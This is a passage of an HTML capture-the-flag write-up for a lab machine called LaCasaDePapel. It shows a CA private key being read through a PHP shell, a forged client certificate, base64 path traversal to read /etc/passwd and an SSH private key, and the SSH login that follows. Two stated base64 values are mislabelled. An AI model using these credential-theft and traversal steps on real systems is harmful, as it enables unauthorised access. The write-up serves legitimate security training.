+                &nbsp;&nbsp;&nbsp;YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp\n<br>
+                &nbsp;&nbsp;&nbsp;s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us\n<br>
+                &nbsp;&nbsp;&nbsp;PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V\n<br>
+                &nbsp;&nbsp;&nbsp;Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89\n<br>
+                &nbsp;&nbsp;&nbsp;1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ\n<br>
+                &nbsp;&nbsp;&nbsp;/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+\n<br>
+                &nbsp;&nbsp;&nbsp;q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr\n<br>
+                &nbsp;&nbsp;&nbsp;uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd\n<br>
+                &nbsp;&nbsp;&nbsp;I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og\n<br>
+                &nbsp;&nbsp;&nbsp;7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE\n<br>
+                &nbsp;&nbsp;&nbsp;G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn\n<br>
+                &nbsp;&nbsp;&nbsp;sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH\n<br>
+                &nbsp;&nbsp;&nbsp;CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y\n<br>
+                &nbsp;&nbsp;&nbsp;sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI\n<br>
+                &nbsp;&nbsp;&nbsp;ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2\n<br>
+                &nbsp;&nbsp;&nbsp;zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/\n<br>
+                &nbsp;&nbsp;&nbsp;ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC\n<br>
+                &nbsp;&nbsp;&nbsp;9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M\n<br>
+                &nbsp;&nbsp;&nbsp;WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM\n<br>
+                &nbsp;&nbsp;&nbsp;7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR\n<br>
+                &nbsp;&nbsp;&nbsp;aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc\n<br>
+                &nbsp;&nbsp;&nbsp;53udBEzjt3WPqYGkkDknVhjD\n<br>
+                &nbsp;&nbsp;&nbsp;-----END&nbsp;PRIVATE&nbsp;KEY-----\n<br>
+                &nbsp;&nbsp;&nbsp;"""
+            </div>
+        </div><br>
+        <br>
+        You can run whatever php functions you like here, except stuff which lets you run system commands like <code>exec()</code><br>
+        <code>scandir('&lt;directory')</code> will list the contents of directories<br>
+        <code>file_put_contents()</code> will upload files.<br>
+        <code>file_get_contents()</code> will read files etc.<br>
+        <br>
+        You don't need to do anything (although I think there's a 2nd route through the machine here), but you can browse the filesystem for reconnaissance.<br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) Create client certificate</strong></h2><br>
+        After getting lacasadepapel's certificate private key from /home/nairobi/ca.key, we have have everything we need to generate a client certificate that will let us access the https/443 portion of the site.<br>
+        <br>
+        As a recap, we need:<br>
+        • lacasadepapel's public certificate (which we can get using <code>openssl</code>)<br>
+        • lacasadepapel's private key (which we've just got from /home/nairobi/ca.key)<br>
+        • and our own public key, private key and certificate signing request (which we can generate ourselves using <code>openssl</code>)<br>
+        <br>
+        This site helped me - <a href="https://medium.com/@sevcsik/authentication-using-https-client-certificates-3c9d270e8326">https://medium.com/@sevcsik/authentication-using-https-client-certificates-3c9d270e8326</a>.<br>
+        <br>
+        1) Get lacasadepapel's public certificate using <code>openssl</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/lecasadepapel/openssl#&nbsp;openssl&nbsp;s_client&nbsp;-showcerts&nbsp;-connect&nbsp;10.10.10.131:443<br>
+                ...<br>
+                -----BEGIN&nbsp;CERTIFICATE-----<br>
+                MIIC6jCCAdICCQDISiE8M6B29jANBgkqhkiG9w0BAQsFADA3MRowGAYDVQQDDBFs<br>
+                YWNhc2FkZXBhcGVsLmh0YjEZMBcGA1UECgwQTGEgQ2FzYSBEZSBQYXBlbDAeFw0x<br>
+                OTAxMjcwODM1MzBaFw0yOTAxMjQwODM1MzBaMDcxGjAYBgNVBAMMEWxhY2FzYWRl<br>
+                cGFwZWwuaHRiMRkwFwYDVQQKDBBMYSBDYXNhIERlIFBhcGVsMIIBIjANBgkqhkiG<br>
+                9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3M6VN7OD5sHW+zCbIv/5vJpuaxJF3A5q2rV<br>
+                QJNqU1sFsbnaPxRbFgAtc8hVeMNii2nCFO8PGGs9P9pvoy8e8DR9ksBQYyXqOZZ8<br>
+                /rsdxwfjYVgv+a3UbJNO4e9Sd3b8GL+4XIzzSi3EZbl7dlsOhl4+KB4cM4hNhE5B<br>
+                4K8UKe4wfKS/ekgyCRTRENVqqd3izZzz232yyzFvDGEOFJVzmhlHVypqsfS9rKUV<br>
+                ESPHczaEQld3kupVrt/mBqwuKe99sluQzORqO1xMqbNgb55ZD66vQBSkN2PwBeiR<br>
+                PBRNXfnWla3Gkabukpu9xR9o+l7ut13PXdQ/fPflLDwnu5wMZwIDAQABMA0GCSqG<br>
+                SIb3DQEBCwUAA4IBAQCuo8yzORz4pby9tF1CK/4cZKDYcGT/wpa1v6lmD5CPuS+C<br>
+                hXXBjK0gPRAPhpF95DO7ilyJbfIc2xIRh1cgX6L0ui/SyxaKHgmEE8ewQea/eKu6<br>
+                vmgh3JkChYqvVwk7HRWaSaFzOiWMKUU8mB/7L95+mNU7DVVUYB9vaPSqxqfX6ywx<br>
+                BoJEm7yf7QlJTH3FSzfew1pgMyPxx0cAb5ctjQTLbUj1rcE9PgcSki/j9WyJltkI<br>
+                EqSngyuJEu3qYGoM0O5gtX13jszgJP+dA3vZ1wqFjKlWs2l89pb/hwRR2raqDwli<br>
+                MgnURkjwvR1kalXCvx9cST6nCkxF2TxlmRpyNXy4<br>
+                -----END&nbsp;CERTIFICATE-----<br>
+                ...
+            </div>
+        </div><br>
+        <br>
+        You'll also see lacasadepapel's specifications for “acceptable client certificate CA names�.<br>
+            <div class="codebox">
+                Acceptable&nbsp;client&nbsp;certificate&nbsp;CA&nbsp;names<br>
+                CN&nbsp;=&nbsp;lacasadepapel.htb,&nbsp;O&nbsp;=&nbsp;La&nbsp;Casa&nbsp;De&nbsp;Papel
+            </div>
+        </div><br>
+        <br>
+        2) Create your own public key, private key, and certificate signing request<br>
+            <div class="codebox">
+                root@gotham:~/ctf/lecasadepapel/openssl#&nbsp;openssl&nbsp;req&nbsp;-newkey&nbsp;rsa:4096&nbsp;-keyout&nbsp;tic_key.pem&nbsp;-out&nbsp;tic_csr.pem&nbsp;-nodes&nbsp;-days&nbsp;365&nbsp;-subj&nbsp;"/CN=Tic"<br>
+                Ignoring&nbsp;-days;&nbsp;not&nbsp;generating&nbsp;a&nbsp;certificate<br>
+                Generating&nbsp;a&nbsp;RSA&nbsp;private&nbsp;key<br>
+                ..........................++++<br>
+                ....................................................++++<br>
+                writing&nbsp;new&nbsp;private&nbsp;key&nbsp;to&nbsp;'tic_key.pem'<br>
+                -----<br>
+                root@gotham:~/ctf/lecasadepapel/openssl#&nbsp;ls<br>
+                tic_csr.pem&nbsp;&nbsp;tic_key.pem<br>
+            </div>
+        </div><br>
+        <br>
+        3) Sign your certificate signing request with<br>
+        • lecasadepapel.htb's public certificate<br>
+        ◇ which we retrieved from <code>openssl -conncect -showcerts</code><br>
+        • and lecasadepapel.htb's private key<br>
+        ◇ which we retrieved from /home/nairobi/ca.key on the Psy Shell on port 6200 - <code>sudo file_get_contents</code><strong><code>(</code></strong><code>'/home/nairobi/ca.key')</code><br>
+        <br>
+        3a) I echo'ed lacasadepapel's private key into its own file (if you're copy/pasting make sure to get rid of the <code>&gt;</code>)<br>
+            <div class="codebox">
+                root@gotham:~/ctf/lecasadepapel/openssl#&nbsp;echo&nbsp;"-----BEGIN&nbsp;PRIVATE&nbsp;KEY-----<br>
+                &gt;&nbsp;MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb<br>
+                &gt;&nbsp;7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/<br>
+                &gt;&nbsp;2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl<br>
+                &gt;&nbsp;uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M<br>
+                &gt;&nbsp;YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp<br>
+                &gt;&nbsp;s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us<br>
+                &gt;&nbsp;PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V<br>
+                &gt;&nbsp;Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89<br>
+                &gt;&nbsp;1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ<br>
+                &gt;&nbsp;/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+<br>
+                &gt;&nbsp;q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr<br>
+                &gt;&nbsp;uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd<br>
+                &gt;&nbsp;I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og<br>
+                &gt;&nbsp;7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE<br>
+                &gt;&nbsp;G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn<br>
+                &gt;&nbsp;sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH<br>
+                &gt;&nbsp;CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y<br>
+                &gt;&nbsp;sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI<br>
+                &gt;&nbsp;ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2<br>
+                &gt;&nbsp;zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/<br>
+                &gt;&nbsp;ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC<br>
+                &gt;&nbsp;9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M<br>
+                &gt;&nbsp;WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM<br>
+                &gt;&nbsp;7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR<br>
+                &gt;&nbsp;aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc<br>
+                &gt;&nbsp;53udBEzjt3WPqYGkkDknVhjD<br>
+                &gt;&nbsp;-----END&nbsp;PRIVATE&nbsp;KEY-----"&nbsp;&gt;&nbsp;casa_privkey.pem
+            </div>
+        </div><br>
+        <br>
+        3b) And I echo'ed lacasadepapel's public certificate into its own file (if you're copy/pasting make sure to get rid of the <code>&gt;</code>)<br>
+            <div class="codebox">
+                root@gotham:~/ctf/lecasadepapel/openssl#&nbsp;echo&nbsp;"-----BEGIN&nbsp;CERTIFICATE-----<br>
+                &gt;&nbsp;MIIC6jCCAdICCQDISiE8M6B29jANBgkqhkiG9w0BAQsFADA3MRowGAYDVQQDDBFs<br>
+                &gt;&nbsp;YWNhc2FkZXBhcGVsLmh0YjEZMBcGA1UECgwQTGEgQ2FzYSBEZSBQYXBlbDAeFw0x<br>
+                &gt;&nbsp;OTAxMjcwODM1MzBaFw0yOTAxMjQwODM1MzBaMDcxGjAYBgNVBAMMEWxhY2FzYWRl<br>
+                &gt;&nbsp;cGFwZWwuaHRiMRkwFwYDVQQKDBBMYSBDYXNhIERlIFBhcGVsMIIBIjANBgkqhkiG<br>
+                &gt;&nbsp;9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3M6VN7OD5sHW+zCbIv/5vJpuaxJF3A5q2rV<br>
+                &gt;&nbsp;QJNqU1sFsbnaPxRbFgAtc8hVeMNii2nCFO8PGGs9P9pvoy8e8DR9ksBQYyXqOZZ8<br>
+                &gt;&nbsp;/rsdxwfjYVgv+a3UbJNO4e9Sd3b8GL+4XIzzSi3EZbl7dlsOhl4+KB4cM4hNhE5B<br>
+                &gt;&nbsp;4K8UKe4wfKS/ekgyCRTRENVqqd3izZzz232yyzFvDGEOFJVzmhlHVypqsfS9rKUV<br>
+                &gt;&nbsp;ESPHczaEQld3kupVrt/mBqwuKe99sluQzORqO1xMqbNgb55ZD66vQBSkN2PwBeiR<br>
+                &gt;&nbsp;PBRNXfnWla3Gkabukpu9xR9o+l7ut13PXdQ/fPflLDwnu5wMZwIDAQABMA0GCSqG<br>
+                &gt;&nbsp;SIb3DQEBCwUAA4IBAQCuo8yzORz4pby9tF1CK/4cZKDYcGT/wpa1v6lmD5CPuS+C<br>
+                &gt;&nbsp;hXXBjK0gPRAPhpF95DO7ilyJbfIc2xIRh1cgX6L0ui/SyxaKHgmEE8ewQea/eKu6<br>
+                &gt;&nbsp;vmgh3JkChYqvVwk7HRWaSaFzOiWMKUU8mB/7L95+mNU7DVVUYB9vaPSqxqfX6ywx<br>
+                &gt;&nbsp;BoJEm7yf7QlJTH3FSzfew1pgMyPxx0cAb5ctjQTLbUj1rcE9PgcSki/j9WyJltkI<br>
+                &gt;&nbsp;EqSngyuJEu3qYGoM0O5gtX13jszgJP+dA3vZ1wqFjKlWs2l89pb/hwRR2raqDwli<br>
+                &gt;&nbsp;MgnURkjwvR1kalXCvx9cST6nCkxF2TxlmRpyNXy4<br>
+                &gt;&nbsp;-----END&nbsp;CERTIFICATE-----"&nbsp;&gt;&nbsp;casa_pubcert.pem
+            </div>
+        </div><br>
+        <br>
+        3c) And signed my certificate signing request using both lacasadepapel's public certificate and private key<br>
+            <div class="codebox">
+                root@gotham:~/ctf/lecasadepapel/openssl#&nbsp;openssl&nbsp;x509&nbsp;-req&nbsp;-in&nbsp;tic_csr.pem&nbsp;-CA&nbsp;casa_pubcert.pem&nbsp;-CAkey&nbsp;casa_privkey.pem&nbsp;-out&nbsp;tic_cert.pem&nbsp;-set_serial&nbsp;01&nbsp;-days&nbsp;365<br>
+                Signature&nbsp;ok<br>
+                subject=CN&nbsp;=&nbsp;Tic<br>
+                Getting&nbsp;CA&nbsp;Private&nbsp;Key<br>
+                root@gotham:~/ctf/lecasadepapel/openssl#&nbsp;ls<br>
+                casa_privkey.pem&nbsp;&nbsp;casa_pubcert.pem&nbsp;&nbsp;tic_cert.pem&nbsp;&nbsp;tic_csr.pem&nbsp;&nbsp;tic_key.pem
+            </div>
+        </div><br>
+        <br>
+        4) In order to use your newly-signed client certificate with Firefox, you have to bundle the cert and your private key in PKCS#12 format<br>
+            <div class="codebox">
+                root@gotham:~/ctf/lecasadepapel/openssl#&nbsp;openssl&nbsp;pkcs12&nbsp;-export&nbsp;-clcerts&nbsp;-in&nbsp;tic_cert.pem&nbsp;-inkey&nbsp;tic_key.pem&nbsp;-out&nbsp;tic.p12<br>
+                Enter&nbsp;Export&nbsp;Password:&nbsp;pls<br>
+                Verifying&nbsp;-&nbsp;Enter&nbsp;Export&nbsp;Password:&nbsp;pls
+            </div>
+        </div><br>
+        <br>
+        5) Import the .p12 file into Firefox<br>
+        Preferences &gt; Privacy &amp; Security &gt; View Certficates &gt; Your Certificates &gt; Import<br>
+        <br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        Refresh <a href="https://lecasadepapel.htb/">https://lecasadepapel.htb</a>.<br>
+        Select the certificate you just created when prompted and you should be in the private area!<br>
+        <br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        <em>*Note: I had to switch burp off so that I could use my user cert.</em><br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) 443/https</strong></h2><br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        That URL looks like it's vulnerable to file inclusion.<br>
+        <br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        But when attempting to read <code>/etc/passwd</code> we get an error.<br>
+        The error message is a pretty crucial hint here, specifically line 1 and 2:<br>
+        <code>scandir '/home/berlin/downloads//etc/paswd/</code><br>
+        and <code>Object.fs.readdirSync</code><br>
+        <br>
+        The <code>?path=</code> is reading directories, not paths (as indicated by the <code>fs.readdirSync</code> javascript function).<br>
+        <br>
+        Further browsing shows us some files that we can download.<br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        Downloading <code>SEASON-2 01.avi</code> takes us to this URL - <code>https://lacasadepapel.htb/file/U0VBU09OLTIvMDEuYXZp</code><br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+        That URL is slightly suspicious and doesn't resemble the 01.avi file we're downloading at all.<br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>7) Base64 adventures</strong></h2><br>
+        Base64 decoding <code>U0VBU09OLTIvMDEuYXZp</code> decodes to <code>SEASON-2/01.avi</code>.<br>
+        Ah, so these URLs to access files are base64 encoded.<br>
+        <br>
+        Hopefully, we can get Local File Inclusion using this <code>/file</code> URL.<br>
+        <br>
+        *NOTE:<br>
+        For this challenge, I would recommend using <a href="https://www.base64decode.org/.">https://www.base64decode.org/</a> for doing all your base64 encoding/decoding.<br>
+        Submitting base64 strings which include <code>\n</code> will crash the https/443 site, and it's pretty easy to accidentally append <code>\n</code> to your strings using <code>echo</code> and <code>base64</code>.<br>
+        You can prevent the <code>\n</code> from being added by using the <code>echo -n</code> flag, but for the sake of reliability, I used the site.<br>
+        <br>
+        Based on the error from earlier, we know that we're currently sitting in the <code>/home/berlin/downloads</code> directory.<br>
+        <img alt="images\2-9.png" src="images/2-9.png"><br>
+        <br>
+        In that case, in order to retrieve /etc/passwd we have to traverse up 3 directories to reach the root of the filesystem (downloads (1) &gt; berlin (2) &gt; home (3) &gt; /) and then access /etc/passwd from there.<br>
+        <br>
+        So our file inclusion will to retrieve /etc/passwd will be - <code>../../../etc/passwd</code>.<br>
+        That string base64 encoded is <code>Li4vLi4vLi4vZXRjL3Bhc3N3ZA==</code>.<br>
+        <br>
+        Visiting <code>https://lacasadepapel.htb/file/Li4vLi4vLi4vZXRjL3Bhc3N3ZA==</code> we get /etc/passwd!<br>
+        But /etc/passwd isn't enough to get a shell.<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>7a) .ssh</strong></h3><br>
+        At this point, you need to look for other interesting files.<br>
+        There's 2 potential ways of doing this:<br>
+        • on the website using the <code>?path=</code> directory traversal - e.g. <code>https://lacasadepapel.htb/?path=../</code> will show us the contents of <code>/home/berlin</code><br>
+        • on the Psy Shell using the scandir() function - <code>sudo scandir('/home/berlin')</code> - which will list the contents of <code>/home/berlin</code><br>
+        <br>
+        Personally I used the scandir() function on the Psy Shell because I'd already being using it earlier.<br>
+        Reading /home/berlin, we find <code>user.txt</code> and berlin's <code>.ssh</code> folder. We can't read either of those files because they're restricted to user <code>berlin</code>.<br>
+            <div class="codebox">
+                sudo&nbsp;scandir('/home/berlin')<br>
+                =&gt;&nbsp;[<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".",<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"..",<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".ash_history",<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;".ssh",<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"downloads",<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"node_modules",<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"server.js",<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"user.txt",<br>
+                &nbsp;&nbsp;&nbsp;]<br>
+                &nbsp;&nbsp;&nbsp;sudo&nbsp;file_get_contents('/home/berlin/user.txt')<br>
+                PHP&nbsp;Warning:&nbsp;&nbsp;file_get_contents(/home/berlin/user.txt):&nbsp;failed&nbsp;to&nbsp;open&nbsp;stream:&nbsp;Permission&nbsp;denied&nbsp;in&nbsp;phar://eval()'d&nbsp;code&nbsp;on&nbsp;line&nbsp;1<br>
+                sudo&nbsp;scandir('/home/berlin/.ssh/')<br>
+                PHP&nbsp;Warning:&nbsp;&nbsp;scandir(/home/berlin/.ssh/):&nbsp;failed&nbsp;to&nbsp;open&nbsp;dir:&nbsp;Permission&nbsp;denied&nbsp;in&nbsp;phar://eval()'d&nbsp;code&nbsp;on&nbsp;line&nbsp;1<br>
+            </div>
+        </div><br>
+        <br>
+        Taking into account the error message from earlier - <code>no such file or directory, scandir ‘/home/berlin/downloads//etc/passwd'</code> - the https/443 web server is potentially running as the <code>berlin</code> user.<br>
+        <br>
+        You can test this by exploiting the path traversal at <code>?path=</code> and reading a restricted directory like <code>.ssh</code>.<br>
+        <br>
+        <img alt="images\2-10.png" src="images/2-10.png"><br>
+        <br>
+        Nice! So since we can read <code>berlin</code>'s .ssh folder the webserver must be either running as <code>berlin</code> or have some superuser permissions in order to be able to read that restricted <code>.ssh</code> directory.<br>
+        In that case, we can retrieve the <code>berlin</code>'s user.txt flag and, since nmap told us 22/ssh is running, we can grab <code>berlin</code>'s ssh private key at <code>id_rsa</code> in order to get us a shell.<br>
+        <br>
+        We're in <code>/home/berlin/downloads</code> so...<br>
+        <br>
+        <code>../user.txt</code> is the path to retrieve the user flag. Base64 encoded = <code>Li4vLi4vLi4vZXRjL3Bhc3N3ZA==</code><br>
+        The full URL for the user flag - <code>https://lacasadepapel.htb/file/Li4vdXNlci50eHQ=</code><br>
+        <br>
+        <code>../.ssh/id_rsa</code> is the path to retrieve the ssh private key. Base64 encoded = <code>Li4vdXNlci50eHQ=</code><br>
+        The full URL for the ssh private key is - <code>https://lacasadepapel.htb/file/Li4vLnNzaC9pZF9yc2E=</code><br>
+        <br>
+        That's all the files we need.<br>
+        At this point, we're done with the site :)<br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>8) ssh shell</strong></h2><br>
+        First change the permissions of the <code>id_rsa</code> file you retrieved, otherwise you'll get an error and the key will be ignored - <code>chmod 600 id_rsa</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/lecasadepapel/22ssh#&nbsp;ssh&nbsp;-i&nbsp;./id_rsa&nbsp;berlin@10.10.10.131<br>
+                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>
+                @&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;WARNING:&nbsp;UNPROTECTED&nbsp;PRIVATE&nbsp;KEY&nbsp;FILE!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;@<br>
+                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>
+                Permissions&nbsp;0644&nbsp;for&nbsp;'./id_rsa'&nbsp;are&nbsp;too&nbsp;open.<br>
+                It&nbsp;is&nbsp;required&nbsp;that&nbsp;your&nbsp;private&nbsp;key&nbsp;files&nbsp;are&nbsp;NOT&nbsp;accessible&nbsp;by&nbsp;others.<br>
+                This&nbsp;private&nbsp;key&nbsp;will&nbsp;be&nbsp;ignored.<br>
+                Load&nbsp;key&nbsp;"./id_rsa":&nbsp;bad&nbsp;permissions<br>
+                ...<br>
+                root@gotham:~/ctf/lecasadepapel/22ssh#&nbsp;chmod&nbsp;600&nbsp;id_rsa<br>
+                root@gotham:~/ctf/lecasadepapel/22ssh#&nbsp;ls&nbsp;-l<br>
+                total&nbsp;868<br>
+                -rw-------&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;3389&nbsp;Jun&nbsp;20&nbsp;13:59&nbsp;id_rsa<br>
+            </div>
+        </div><br>
+        <br>
+        By using the <code>-i</code> flag, we can provide ssh with a private key - the <code>id_rsa</code> file we just retrieved from the file inclusion - and ssh into the lecasadepapel box as <code>berlin</code>.<br>
+        By submitting the private key of the user you're trying to log in to (in this case <code>berlin</code>), you're authenticating using their private key instead of their password.<br>
+        <br>
+        The <code>-i</code> flag is a replacement for providing a password.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/lecasadepapel/22ssh#&nbsp;ls<br>
+                id_rsa<br>
+                root@gotham:~/ctf/lecasadepapel/22ssh#&nbsp;ssh&nbsp;-i&nbsp;./id_rsa&nbsp;berlin@10.10.10.131<br>
+                berlin@10.10.10.131's&nbsp;password:&nbsp;
+            </div>
+        </div><br>
+        <br>
+        ...But we're being prompted for a password.<br>
+        This shouldn't happen :/<br>
+        <br>
+        <a id="h2-9" name="h2-9"></a><strong></strong>
+        <h2><strong>8a) Whose key is it anyway?</strong></h2><br>
+        This was part of the box that I didn't like.<br>
+        I don't think there was any hint as to whose <code>id_rsa</code> file this was, you just had to guess.<br>
+        <br>
+        If you were logical about it, you wouldn't have wasted a ton of time double-checking the id_rsa file and googling (like I did) and conclude that since we're being prompted for a password by ssh for user <code>berlin</code>, that the <code>id_rsa</code> file we have must be someone else's and not <code>berlin</code>'s.<br>
+        <br>
+        Since we retrieved <code>/etc/passwd</code> earlier from the file inclusion, we can deduce that there are 4 possible users whose the <code>id_rsa</code> key could be.<br>
+            <div class="codebox">
+                root:x:0:0:root:/root:/bin/ash<br>
+                ...<br>
+                dali:x:1000:1000:dali,,,:/home/dali:/usr/bin/psysh<br>
+                berlin:x:1001:1001:berlin,,,:/home/berlin:/bin/ash<br>
+                professor:x:1002:1002:professor,,,:/home/professor:/bin/ash
+            </div>
+        </div><br>
+        <br>
+        Try 'em all.<br>
+        It's <code>professor</code>'s.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/lecasadepapel/22ssh#&nbsp;ssh&nbsp;professor@10.10.10.131&nbsp;-i&nbsp;./id_rsa<br>
+                <br>
+                &nbsp;_&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;____&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;____&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;____&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_&nbsp;<br>
